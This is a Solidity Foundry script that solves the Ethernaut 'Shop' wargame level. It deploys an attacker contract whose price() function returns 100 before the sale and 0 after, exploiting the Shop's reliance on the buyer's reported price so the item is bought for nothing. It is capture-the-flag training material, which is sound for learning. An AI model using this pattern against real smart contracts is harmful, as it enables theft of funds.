//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Shop}  from "src/ethernaut21.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut21Script is Script{
 Shop instance = Shop(payable(0xc4b001bc67688F19FB361Cb141ACa24bd560f085));   
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker attacke = new attacker();
        attacke.attack();

        vm.stopBroadcast();
    }
}

contract attacker{
    Shop instance = Shop(payable(0xc4b001bc67688F19FB361Cb141ACa24bd560f085));
    constructor() payable{}

    function attack() public{
        instance.buy();
    }

    function price() external view returns (uint256){
        if(instance.isSold()){
            return 0;
        }else{
        return 100;
        }
    }
}


